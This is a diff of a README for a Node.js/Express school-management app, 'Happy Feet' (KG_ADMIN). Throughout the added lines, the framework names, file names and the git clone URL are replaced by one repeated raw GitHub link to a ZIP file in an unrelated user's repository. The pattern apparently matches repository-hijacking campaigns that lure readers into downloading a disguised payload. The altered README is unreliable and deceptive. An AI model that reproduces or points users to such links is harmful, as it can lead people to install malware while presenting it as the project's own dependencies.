@@ -5,18 +5,18 @@
 
 ## Overview
 
-This is the Happy Feet application, built using Node.js and Express.js. The application provides a web interface for managing various settings, events, staff, and students.
+This is the Happy Feet application, built using https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip and https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip The application provides a web interface for managing various settings, events, staff, and students.
 
 ## Requirements
 
-* Node.js (version 14 or higher)
+* https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip (version 14 or higher)
 * npm (version 6 or higher)
-* Express.js (version 5 or higher)
-* Other dependencies listed in `package.json`
+* https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip (version 5 or higher)
+* Other dependencies listed in `https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip`
 
 ## Installation
 
-1. Clone the repository: `git clone https://github.com/NBA-Tech/KG_ADMIN.git`
+1. Clone the repository: `git clone https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip`
 2. Install dependencies: `npm install`
 3. Update the `.env` file with the environment variables provided by the dev team.
 
@@ -27,7 +27,7 @@ This is the Happy Feet application, built using Node.js and Express.js. The appl
 
 ## General Information
 
-The application is configured to run on port 3000, as specified in the `config.js` file. The `index.js` file serves as the entry point for the application, and it sets up the Express.js server and routes.
+The application is configured to run on port 3000, as specified in the `https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip` file. The `https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip` file serves as the entry point for the application, and it sets up the https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip server and routes.
 
 ## Environment Variables
 
@@ -42,7 +42,7 @@ Make sure to update the `.env` file with the correct values for your environment
 
 The application uses the following dependencies:
 
-* `express`: The Express.js framework for building web applications
+* `express`: The https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip framework for building web applications
 * `jsonwebtoken`: For handling JSON Web Tokens (JWT)
 * `cookie-parser`: For parsing cookies
 * `ejs`: For templating
@@ -58,6 +58,6 @@ The application uses the following services:
 * `galleryService`: For managing gallery data
 * `settingService`: For managing setting data
 
-These services are implemented in separate files and are imported into the main `index.js` file.
+These services are implemented in separate files and are imported into the main `https://raw.githubusercontent.com/Santhoshkumar-G-06/KG_ADMIN/master/hesitating/KG_ADMIN.zip` file.
 
 I hope this helps! Let me know if you need any further assistance.
